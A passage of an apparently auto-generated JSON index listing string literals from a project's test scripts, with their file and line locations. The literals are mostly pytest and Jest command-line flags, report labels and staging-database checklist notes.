      "value": "- CRITICAL:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:288"
      ]
    },
    "- Check if 'postgres' DB has auth tables": {
      "value": "- Check if 'postgres' DB has auth tables",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:121"
      ]
    },
    "- Cloud SQL Unix socket connection (secure)": {
      "value": "- Cloud SQL Unix socket connection (secure)",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:260"
      ]
    },
    "- Commands are DRY RUN only (no actual migration)": {
      "value": "- Commands are DRY RUN only (no actual migration)",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:257"
      ]
    },
    "- Configuration files:": {
      "value": "- Configuration files:",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:189"
      ]
    },
    "- Confirm session management": {
      "value": "- Confirm session management",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:138"
      ]
    },
    "- Conftest files:": {
      "value": "- Conftest files:",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:281"
      ]
    },
    "- Cross-Category Overlaps:": {
      "value": "- Cross-Category Overlaps:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:565"
      ]
    },
    "- Deploy with corrected credentials": {
      "value": "- Deploy with corrected credentials",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:132"
      ]
    },
    "- Duplicates:": {
      "value": "- Duplicates:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:566"
      ]
    },
    "- Ensure auth service tables exist in target database": {
      "value": "- Ensure auth service tables exist in target database",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:128"
      ]
    },
    "- Ensures AI quality meets expectations": {
      "value": "- Ensures AI quality meets expectations",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:505"
      ]
    },
    "- Environment detection logic works as expected": {
      "value": "- Environment detection logic works as expected",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:171"
      ]
    },
    "- Errors in": {
      "value": "- Errors in",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_order.py:110"
      ]
    },
    "- Failed:": {
      "value": "- Failed:",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:199"
      ]
    },
    "- Failing:": {
      "value": "- Failing:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:903"
      ]
    },
    "- File size violations:": {
      "value": "- File size violations:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:867"
      ]
    },
    "- Fixed": {
      "value": "- Fixed",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_order.py:108"
      ]
    },
    "- Frontend:": {
      "value": "- Frontend:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:47"
      ]
    },
    "- Full customer journey validation": {
      "value": "- Full customer journey validation",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:503"
      ]
    },
    "- Function size violations:": {
      "value": "- Function size violations:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:868"
      ]
    },
    "- Highly Similar:": {
      "value": "- Highly Similar:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:567"
      ]
    },
    "- Integration tests with mocks defeat the purpose of integration testing": {
      "value": "- Integration tests with mocks defeat the purpose of integration testing",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:507"
      ]
    },
    "- Internal Overlaps:": {
      "value": "- Internal Overlaps:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:564"
      ]
    },
    "- MAJOR:": {
      "value": "- MAJOR:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:289"
      ]
    },
    "- MINOR:": {
      "value": "- MINOR:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:290"
      ]
    },
    "- Max violation:": {
      "value": "- Max violation:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:886"
      ]
    },
    "- Mock component implementations in test files violate real test requirements": {
      "value": "- Mock component implementations in test files violate real test requirements",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:506"
      ]
    },
    "- Monitor logs for connection success": {
      "value": "- Monitor logs for connection success",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:133"
      ]
    },
    "- OAuth configuration appropriate for each environment": {
      "value": "- OAuth configuration appropriate for each environment",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:172"
      ]
    },
    "- OR 'postgres' database doesn't have the required tables/schema": {
      "value": "- OR 'postgres' database doesn't have the required tables/schema",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:110"
      ]
    },
    "- OR create 'netra_staging' database for staging": {
      "value": "- OR create 'netra_staging' database for staging",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:122"
      ]
    },
    "- Passed:": {
      "value": "- Passed:",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:199"
      ]
    },
    "- Passing:": {
      "value": "- Passing:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:902"
      ]
    },
    "- Risk of false positive test results hiding real bugs": {
      "value": "- Risk of false positive test results hiding real bugs",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:508"
      ]
    },
    "- Run Alembic migrations if needed": {
      "value": "- Run Alembic migrations if needed",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:129"
      ]
    },
    "- SPEC/testing.xml (comprehensive testing standards)": {
      "value": "- SPEC/testing.xml (comprehensive testing standards)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:314"
      ]
    },
    "- SSL parameters handled automatically": {
      "value": "- SSL parameters handled automatically",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:259"
      ]
    },
    "- Secret Manager postgres-db-staging = 'postgres'": {
      "value": "- Secret Manager postgres-db-staging = 'postgres'",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:95"
      ]
    },
    "- Skipped": {
      "value": "- Skipped",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_order.py:109"
      ]
    },
    "- Test directories:": {
      "value": "- Test directories:",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:282"
      ]
    },
    "- Test locations:": {
      "value": "- Test locations:",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:278"
      ]
    },
    "- Test login flow": {
      "value": "- Test login flow",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:136"
      ]
    },
    "- Test runners found:": {
      "value": "- Test runners found:",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:190"
      ]
    },
    "- Tests validated:": {
      "value": "- Tests validated:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:901"
      ]
    },
    "- Tests:": {
      "value": "- Tests:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:561",
        "scripts/real_service_test_metrics.py:198"
      ]
    },
    "- Total Lines:": {
      "value": "- Total Lines:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:562"
      ]
    },
    "- Total test files:": {
      "value": "- Total test files:",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:277"
      ]
    },
    "- Total violations:": {
      "value": "- Total violations:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:887"
      ]
    },
    "- Using psycopg2 driver for Alembic compatibility": {
      "value": "- Using psycopg2 driver for Alembic compatibility",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:258"
      ]
    },
    "- Validates SLA compliance": {
      "value": "- Validates SLA compliance",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:507"
      ]
    },
    "- Verify JWT token generation": {
      "value": "- Verify JWT token generation",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:137"
      ]
    },
    "- [ ]": {
      "value": "- [ ]",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:196",
        "scripts/compliance/real_test_linter.py:203",
        "scripts/compliance/real_test_linter.py:210",
        "scripts/compliance/real_test_linter.py:219"
      ]
    },
    "- [CRITICAL]:": {
      "value": "- [CRITICAL]:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:332"
      ]
    },
    "- [MAJOR]:": {
      "value": "- [MAJOR]:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:333"
      ]
    },
    "- [MINOR]:": {
      "value": "- [MINOR]:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:334"
      ]
    },
    "- `": {
      "value": "- `",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:578",
        "scripts/analyze_test_overlap.py:606",
        "scripts/generate_test_audit.py:176",
        "scripts/generate_test_audit.py:199"
      ]
    },
    "- app/tests/examples/test_real_functionality_examples.py (patterns)": {
      "value": "- app/tests/examples/test_real_functionality_examples.py (patterns)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:315"
      ]
    },
    "- tests are already failing": {
      "value": "- tests are already failing",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:815"
      ]
    },
    "--": {
      "value": "--",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:123",
        "auth_service/tests/test_security.py:177",
        "auth_service/tests/test_security.py:207",
        "auth_service/tests/test_security.py:615",
        "scripts/fix_common_test_issues.py:58",
        "scripts/startup_test_executor.py:143",
        "scripts/test_frontend.py:120",
        "scripts/test_frontend.py:121",
        "scripts/test_frontend.py:227",
        "scripts/test_frontend.py:229"
      ]
    },
    "---": {
      "value": "---",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:160",
        "auth_service/test_actual_staging_credentials.py:160",
        "auth_service/test_url_construction.py:226",
        "auth_service/test_url_construction.py:226"
      ]
    },
    "--- Iteration": {
      "value": "--- Iteration",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:12"
      ]
    },
    "--- Progress Summary ---": {
      "value": "--- Progress Summary ---",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:132"
      ]
    },
    "--all": {
      "value": "--all",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:41"
      ]
    },
    "--allow-prod": {
      "value": "--allow-prod",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:743"
      ]
    },
    "--api-port": {
      "value": "--api-port",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:207"
      ]
    },
    "--asyncio-mode=auto": {
      "value": "--asyncio-mode=auto",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:45",
        "scripts/test_backend.py:284"
      ]
    },
    "--auth-url": {
      "value": "--auth-url",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:169"
      ]
    },
    "--auto-split": {
      "value": "--auto-split",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:522"
      ]
    },
    "--backend-url": {
      "value": "--backend-url",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:174"
      ]
    },
    "--backup-dir": {
      "value": "--backup-dir",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:935"
      ]
    },
    "--bail": {
      "value": "--bail",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:581"
      ]
    },
    "--base-url": {
      "value": "--base-url",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:209"
      ]
    },
    "--benchmark": {
      "value": "--benchmark",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:378"
      ]
    },
    "--build": {
      "value": "--build",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:410"
      ]
    },
    "--cache-dir": {
      "value": "--cache-dir",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:380"
      ]
    },
    "--cacheDirectory": {
      "value": "--cacheDirectory",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:154"
      ]
    },
    "--categories": {
      "value": "--categories",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:18",
        "scripts/unified_test_runner.py:723"
      ]
    },
    "--category": {
      "value": "--category",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:69",
        "scripts/test_backend.py:481",
        "scripts/test_backend_optimized.py:368",
        "scripts/test_frontend.py:388",
        "scripts/unified_test_runner.py:718"
      ]
    },
    "--check-deps": {
      "value": "--check-deps",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:510",
        "scripts/test_frontend.py:415"
      ]
    },
    "--cleanup-on-exit": {
      "value": "--cleanup-on-exit",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:423"
      ]
    },
    "--clear-cache": {
      "value": "--clear-cache",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:384"
      ]
    },
    "--color=yes": {
      "value": "--color=yes",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:284"
      ]
    },
    "--confirm-unsafe": {
      "value": "--confirm-unsafe",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:923"
      ]
    },
    "--cov": {
      "value": "--cov",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:495",
        "scripts/test_frontend.py:401"
      ]
    },
    "--cov-fail-under=": {
      "value": "--cov-fail-under=",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:263",
        "scripts/unified_test_config.py:367"
      ]
    },
    "--cov-report=html": {
      "value": "--cov-report=html",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:360",
        "scripts/unified_test_runner.py:529"
      ]
    },
    "--cov-report=html:reports/coverage/html": {
      "value": "--cov-report=html:reports/coverage/html",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:261"
      ]
    },
    "--cov-report=json": {
      "value": "--cov-report=json",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:113"
      ]
    },
    "--cov-report=json:reports/coverage/coverage.json": {
      "value": "--cov-report=json:reports/coverage/coverage.json",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:262"
      ]
    },
    "--cov-report=term-missing": {
      "value": "--cov-report=term-missing",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:73",
        "scripts/startup_test_executor.py:229",
        "scripts/test_backend.py:262",
        "scripts/unified_test_config.py:361",
        "scripts/unified_test_runner.py:530"
      ]
    },
    "--cov=": {
      "value": "--cov=",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:359"
      ]
    },
    "--cov=.": {
      "value": "--cov=.",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:528"
      ]
    },
    "--cov=app": {
      "value": "--cov=app",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:113"
      ]
    },
    "--cov=netra_backend.app": {
      "value": "--cov=netra_backend.app",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:73",
        "scripts/startup_test_executor.py:229",
        "scripts/test_backend.py:261"
      ]
    },
    "--coverage": {
      "value": "--coverage",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:145",
        "scripts/test_backend.py:495",
        "scripts/test_frontend.py:128",
        "scripts/test_frontend.py:401",
        "scripts/test_frontend_simple.py:39"
      ]
    },
    "--coverage=false": {
      "value": "--coverage=false",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:579"
      ]
    },
    "--coverageDirectory=": {
      "value": "--coverageDirectory=",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:130"
      ]
    },
    "--cypress-open": {
      "value": "--cypress-open",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:395"
      ]
    },
    "--detectOpenHandles": {
      "value": "--detectOpenHandles",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:122"
      ]
    },
    "--directory": {
      "value": "--directory",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:376"
      ]
    },
    "--disable-auto-split": {
      "value": "--disable-auto-split",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:833"
      ]
    },
    "--disable-safe-mode": {
      "value": "--disable-safe-mode",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:931"
      ]
    },
    "--disable-warnings": {
      "value": "--disable-warnings",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:46",
        "scripts/startup_test_executor.py:70",
        "scripts/startup_test_executor.py:223",
        "scripts/test_backend.py:287",
        "scripts/test_failure_scanner.py:102"
      ]
    },
    "--docker": {
      "value": "--docker",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:172"
      ]
    },
    "--dry-run": {
      "value": "--dry-run",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:234",
        "scripts/auto_fix_test_sizes.py:718",
        "scripts/auto_fix_test_violations.py:919",
        "scripts/standardize_l3_test_names.py:250"
      ]
    },
    "--dry-run, -n     : Show what would be renamed without doing it": {
      "value": "--dry-run, -n     : Show what would be renamed without doing it",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:301"
      ]
    },
    "--durations=20": {
      "value": "--durations=20",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:273"
      ]
    },
    "--e2e": {
      "value": "--e2e",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:394"
      ]
    },
    "--env": {
      "value": "--env",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:56",
        "scripts/unified_test_runner.py:730"
      ]
    },
    "--exclude-env": {
      "value": "--exclude-env",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:737"
      ]
    },
    "--execute": {
      "value": "--execute",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:287"
      ]
    },
    "--execute         : Actually perform the renames": {
      "value": "--execute         : Actually perform the renames",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:302"
      ]
    },
    "--execute --limit=30": {
      "value": "--execute --limit=30",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:288"
      ]
    },
    "--fail-fast": {
      "value": "--fail-fast",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:489"
      ]
    },
    "--fail-fast-mode": {
      "value": "--fail-fast-mode",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:813"
      ]
    },
    "--failed-first": {
      "value": "--failed-first",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:242",
        "scripts/test_backend.py:490"
      ]
    },
    "--fast-fail": {
      "value": "--fast-fail",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:17",
        "scripts/batch_fix_and_test.py:69",
        "scripts/iterative_test_fix_loop.py:35",
        "scripts/simple_test_fix_loop.py:18",
        "scripts/unified_test_runner.py:788"
      ]
    },
    "--ff": {
      "value": "--ff",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:243",
        "scripts/test_backend.py:490"
      ]
    },
    "--file": {
      "value": "--file",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:722",
        "scripts/compliance/fake_test_scanner.py:378"
      ]
    },
    "--fix": {
      "value": "--fix",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:256",
        "scripts/remove_test_stubs.py:356",
        "scripts/test_frontend.py:317",
        "scripts/test_frontend.py:408"
      ]
    },
    "--force": {
      "value": "--force",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:149",
        "scripts/test_frontend.py:528"
      ]
    },
    "--force-unsafe-fix": {
      "value": "--force-unsafe-fix",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:921"
      ]
    },
    "--forceExit": {
      "value": "--forceExit",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:122"
      ]
    },
    "--format": {
      "value": "--format",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:777",
        "scripts/compliance/fake_test_scanner.py:386",
        "scripts/compliance/test_refactor_helper.py:674",
        "scripts/compliance/test_size_validator.py:519",
        "scripts/remove_test_stubs.py:358"
      ]
    },
    "--frontend-port": {
      "value": "--frontend-port",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:208"
      ]
    },
    "--full": {
      "value": "--full",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:80"
      ]
    },
    "--git-diff": {
      "value": "--git-diff",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:260"
      ]
    },
    "--github-actions": {
      "value": "--github-actions",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:109"
      ]
    },
    "--help": {
      "value": "--help",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:298",
        "scripts/test_verify_workflow.py:32",
        "scripts/test_verify_workflow_status.py:81",
        "scripts/test_verify_workflow_status_corrected.py:88"
      ]
    },
    "--help, -h        : Show this help": {
      "value": "--help, -h        : Show this help",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:304"
      ]
    },
    "--host": {
      "value": "--host",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:61",
        "auth_service/tests/test_auth_startup_integration.py:256",
        "auth_service/tests/test_auth_startup_integration.py:265",
        "scripts/test_websocket_dev_mode.py:56"
      ]
    },
    "--html-output": {
      "value": "--html-output",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:504"
      ]
    },
    "--html=reports/tests/report.html": {
      "value": "--html=reports/tests/report.html",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:280"
      ]
    },
    "--install-deps": {
      "value": "--install-deps",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:416"
      ]
    },
    "--integration-first": {
      "value": "--integration-first",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:724"
      ]
    },
    "--isolation": {
      "value": "--isolation",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:512",
        "scripts/test_frontend.py:422"
      ]
    },
    "--iterations": {
      "value": "--iterations",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:171"
      ]
    },
    "--json": {
      "value": "--json",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:53",
        "scripts/test_staging_env.py:210",
        "scripts/test_staging_startup.py:289"
      ]
    },
    "--json-output": {
      "value": "--json-output",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:503"
      ]
    },
    "--json-report": {
      "value": "--json-report",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:36",
        "scripts/test_backend.py:278",
        "scripts/test_example_message_flow.py:95"
      ]
    },
    "--json-report-file=reports/tests/report.json": {
      "value": "--json-report-file=reports/tests/report.json",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:278"
      ]
    },
    "--json-report-file=test_results.json": {
      "value": "--json-report-file=test_results.json",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:96"
      ]
    },
    "--keyword": {
      "value": "--keyword",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:482",
        "scripts/test_frontend.py:389"
      ]
    },
    "--level": {
      "value": "--level",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:17",
        "scripts/iterative_test_fix_loop.py:31",
        "scripts/iterative_test_fix_loop.py:32",
        "scripts/iterative_test_fix_loop.py:33",
        "scripts/test_frontend_simple.py:75",
        "scripts/test_staging.py:55"
      ]
    },
    "--limit=": {
      "value": "--limit=",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:254"
      ]
    },
    "--limit=N, -lN    : Process only first N files": {
      "value": "--limit=N, -lN    : Process only first N files",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:303"
      ]
    },
    "--lint": {
      "value": "--lint",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:407"
      ]
    },
    "--list": {
      "value": "--list",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:154"
      ]
    },
    "--list-categories": {
      "value": "--list-categories",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:848"
      ]
    },
    "--markers": {
      "value": "--markers",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:483"
      ]
    },
    "--max-files": {
      "value": "--max-files",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:720",
        "scripts/auto_fix_test_violations.py:925"
      ]
    },
    "--max-workers": {
      "value": "--max-workers",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:761"
      ]
    },
    "--maxWorkers=": {
      "value": "--maxWorkers=",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:585"
      ]
    },
    "--maxWorkers=1": {
      "value": "--maxWorkers=1",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:36",
        "scripts/test_frontend_simple.py:40"
      ]
    },
    "--maxWorkers=2": {
      "value": "--maxWorkers=2",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:37",
        "scripts/test_frontend_simple.py:38"
      ]
    },
    "--maxfail=1": {
      "value": "--maxfail=1",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:249"
      ]
    },
    "--maxfail=50": {
      "value": "--maxfail=50",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:102"
      ]
    },
    "--min-coverage": {
      "value": "--min-coverage",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:496"
      ]
    },
    "--module": {
      "value": "--module",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:45"
      ]
    },
    "--name-only": {
      "value": "--name-only",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:228"
      ]
    },
    "--no-bad-test-detection": {
      "value": "--no-bad-test-detection",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:513"
      ]
    },
    "--no-browser": {
      "value": "--no-browser",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:116"
      ]
    },
    "--no-cache": {
      "value": "--no-cache",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:382"
      ]
    },
    "--no-coverage": {
      "value": "--no-coverage",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:17",
        "scripts/batch_fix_and_test.py:69",
        "scripts/iterative_test_fix_loop.py:34",
        "scripts/simple_test_fix_loop.py:18",
        "scripts/unified_test_runner.py:768"
      ]
    },
    "--no-env-setup": {
      "value": "--no-env-setup",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:85"
      ]
    },
    "--no-fail-fast": {
      "value": "--no-fail-fast",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:57"
      ]
    },
    "--no-header": {
      "value": "--no-header",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:368",
        "scripts/test_example_message_flow.py:94",
        "scripts/test_failure_scanner.py:101"
      ]
    },
    "--no-summary": {
      "value": "--no-summary",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:101"
      ]
    },
    "--no-wait": {
      "value": "--no-wait",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:177"
      ]
    },
    "--noEmit": {
      "value": "--noEmit",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:335"
      ]
    },
    "--optimization": {
      "value": "--optimization",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:373"
      ]
    },
    "--output": {
      "value": "--output",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:776",
        "scripts/compliance/fake_test_scanner.py:384",
        "scripts/compliance/test_size_validator.py:521",
        "scripts/remove_test_stubs.py:360",
        "scripts/test_verify_workflow_status.py:147",
        "scripts/test_verify_workflow_status_corrected.py:171"
      ]
    },
    "--parallel": {
      "value": "--parallel",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:488",
        "scripts/unified_test_runner.py:775"
      ]
    },
    "--passWithNoTests": {
      "value": "--passWithNoTests",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:58",
        "scripts/test_frontend_simple.py:36",
        "scripts/test_frontend_simple.py:37",
        "scripts/test_frontend_simple.py:38",
        "scripts/test_frontend_simple.py:39",
        "scripts/test_frontend_simple.py:40"
      ]
    },
    "--pattern": {
      "value": "--pattern",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:800"
      ]
    },
    "--port": {
      "value": "--port",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:62",
        "auth_service/tests/test_auth_startup_integration.py:257",
        "auth_service/tests/test_auth_startup_integration.py:267",
        "scripts/test_websocket_dev_mode.py:57"
      ]
    },
    "--profile": {
      "value": "--profile",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:505"
      ]
    },
    "--progress-mode": {
      "value": "--progress-mode",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:821"
      ]
    },
    "--project-root": {
      "value": "--project-root",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:775",
        "scripts/ci/check_test_stubs.py:111",
        "scripts/remove_test_stubs.py:361"
      ]
    },
